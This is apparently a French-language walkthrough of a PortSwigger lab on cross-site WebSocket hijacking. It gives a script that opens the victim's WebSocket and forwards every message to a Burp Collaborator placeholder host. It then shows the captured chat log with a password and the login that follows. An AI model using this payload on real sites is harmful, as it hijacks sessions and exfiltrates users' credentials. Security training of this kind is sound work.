# Lab

https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab

## Payload

Créer une page qui va se connecter au WebSocket du lab et envoyer le payload :

```html	
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Esnuite dans Burp Collaborator, on peut voir que le payload a été envoyé :

```
{"user":"You","content":"I forgot my password"}
{"user":"Hal Pline","content":"No problem carlos, it's vq34x7gxdm5y2bujcclp"}
```

Puis on peut se connecter avec le mot de passe récupéré.